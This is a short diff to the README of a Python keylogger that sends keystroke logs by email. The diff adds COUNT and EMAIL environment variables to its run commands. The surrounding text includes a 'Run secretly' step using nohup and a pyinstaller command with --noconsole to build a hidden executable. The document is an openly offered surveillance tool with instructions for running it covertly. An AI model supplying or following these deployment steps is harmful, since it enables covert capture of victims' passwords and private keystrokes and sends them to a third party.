@@ -5,7 +5,7 @@ Keylogger written in python with sending log file to mail
 > in the config.py file, and then
 ### Run secretly
 ```
-nohup python3 keypy.py
+COUNT=number_of_characters EMAIL=email nohup python3 keypy.py
 ```
 ### Compile to exe file
 ```
@@ -13,7 +13,7 @@ pyinstaller --onefile --noconsole keypy.py
 ```
 ### Simple start
 ```
-python3 keypy.py
+COUNT=number_of_characters EMAIL=email python3 keypy.py
 ```
 ## Description
 This is a simple keylogger in python with sending logs to your e-mail
